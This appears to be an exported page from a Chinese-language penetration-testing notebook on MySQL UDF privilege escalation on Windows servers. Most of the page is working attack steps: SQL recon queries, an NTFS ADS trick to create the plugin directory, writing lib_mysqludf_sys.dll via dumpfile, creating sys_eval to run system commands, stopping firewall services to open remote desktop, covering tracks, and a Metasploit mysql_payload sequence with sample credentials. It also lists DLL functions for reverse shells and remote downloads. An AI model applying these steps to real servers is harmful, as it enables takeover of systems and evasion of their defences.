<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>UDF提权</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>UDF提权</h1><br/><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\178-lib_mysqludf_sys.dll">Linked file: lib_mysqludf_sys.dll </a></td></tr></table><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\178-一份udf源码.txt">Linked file: 一份udf源码.txt </a></td></tr></table><br /><br /><br />UDF 提权是利用 MYSQL 的自定义函数功能，将 MYSQL 账号转化为系统 system 权限，其利用条件是目标系统是 Windows(Win2000,XP,Win2003)；拥有 MYSQL 的某个用户账号，此账号必须有对 mysql的 insert 和 delete 权限以创建和抛弃函数,有 root 账号密码<br /><br />Windows 下 UDF 提权对于 Windows2008 以下服务器比较适用，也即针对 Windows2000、Windows2003 的成功率较高。<br /><br /><br />1.条件：<br />（1）Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。<br />查看路径:select @@plugin_dir<br />（2）Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。<br />（3）掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。<br />（4）可以将udf.dll写入到相应目录的权限。<br /><br />2. 提权方法<br /><br />（1）获取数据库版本、数据位置以及插件位置等信息<br /><br />select version();//获取数据库版本<br />select user();//获取数据库用户<br />select @@basedir ;//获取安装目录<br />show variables like &#39;%plugins%&#39;;  //寻找mysql安装路径<br />select @@plugin_dir//查看插件路径<br /><br />（2）导出路径<br /><br />C:\Winnt\udf.dll    Windows 2000<br />C:\Windows\udf.dll   Windows2003（有的系统被转义，需要改为C:Windowsudf.dll）<br /><br /><br />在某些情况下，我们会遇到Can&#39;t open shared library的情况<br />这时就需要我们把udf.dll导出到lib\plugin目录下才可以（默认不存在）<br />网上大牛发现利用NTFS ADS流来创建文件夹的方法：<br /><br />select @@basedir;  //查找到mysql的目录<br />select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;   <br />//利用NTFS ADS创建lib目录<br />select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;<br />//利用NTFS ADS创建plugin目录<br /><br />执行成功以后就会 plugin 目录，然后再进行导出 udf.dll 即可。<br /><br />select load_file(&#39;D:/RECYCLER/lib_mysqludf_sys.dll&#39;) into dumpfile&#39;c:/windows/lib_mysqludf_sys.dll&#39;<br /><br />默认mysql没有文件导出的目录<br />mysql.ini修改<br />#允许导入导出的目录<br />#secure_file_priv=C:\Users\xiaohao\Desktop<br /><br /><br /><br />（3）创建cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询：<br /><br />create function sys_eval returns string soname ‘lib_mysqludf_sys.dll’;<br /><br />（4）执行命令：<br />select sys_eval(‘whoami’);<br /><br /><br />连不上3389可以先停止windows防火墙和筛选<br /><br />select sys_eval(‘net stop policyagent’);<br />select sys_eval(‘net stop sharedaccess’);<br /><br /><br />udf.dll下常见函数<br /><br />cmdshell  执行cmd;<br />downloader  下载者,到网上下载指定文件并保存到指定目录;<br />open3389    通用开3389终端服务,可指定端口(不改端口无需重启);<br />backshell   反弹Shell;<br />ProcessView 枚举系统进程;<br />KillProcess 终止指定进程;<br />regread     读注册表;<br />regwrite    写注册表;<br />shut        关机,注销,重启;<br />about       说明与帮助函数;<br /><br />（5）清除痕迹<br />删除<br />drop function sys_eval ;<br /><br /><br />（6）常见错误<br /><br />#1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement<br />SHOW VARIABLES LIKE &quot;secure_file_priv&quot;<br /><br /><br />在my.ini 或者mysql.cnf 文件中注销 (使用#号) 包含secure_file_priv的行。<br /><br />1123 - Can&#39;t initialize function &#39;backshell&#39;; UDFs are unavailable with the --skip-grant-tables option，需要将my.ini中的skip-grant-tables选项去掉。<br /><br /><br /><br />4. msfudf提权<br /><br />msfconsole<br />use exploit/windows/mysql/mysql_payload<br />options<br />set rhost 192.168.2.1<br />set rport 3306<br />set username root<br />set password 123456<br />run 0或者exploit<br /><br />msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是secure-file-priv选项，如果有该选项基本不会成功。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>